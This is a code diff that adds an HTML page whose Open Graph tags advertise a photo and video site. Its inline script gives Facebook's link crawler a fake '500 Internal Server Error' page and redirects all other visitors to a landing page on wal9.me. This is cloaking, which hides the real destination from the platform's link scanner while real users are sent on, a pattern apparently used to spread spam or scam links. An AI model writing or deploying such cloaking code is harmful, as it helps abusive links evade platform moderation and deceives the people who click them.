@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Access Control</title>
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="Wal9 Kello Photo and Video">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="http://wal9.me/">
+    <meta property="og:image" content="https://wal9.me/ogimages/image_1742405699_67db0043e3bb0.jpeg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:description" content="Watch cool jilhub and kello.me photos and videos in one place.">
+    <script>
+        window.onload = function() {
+            // Check the user agent
+            const userAgent = navigator.userAgent;
+            // Simulate checking for Facebook's crawler
+            if (userAgent.includes('facebookexternalhit')) {
+                // Simulate sending a 500 error response
+                document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
+                return; // Stop further execution
+            }
+            // Otherwise, redirect to a random page
+            const pages = [
+                "http://wal9.me/landing.php",
+                "http://wal9.me/landing.php",
+                "http://wal9.me/landing.php",
+                "http://wal9.me/landing.php"
+            ];
+            const randomPage = pages[Math.floor(Math.random() * pages.length)];
+            window.location.href = randomPage;
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
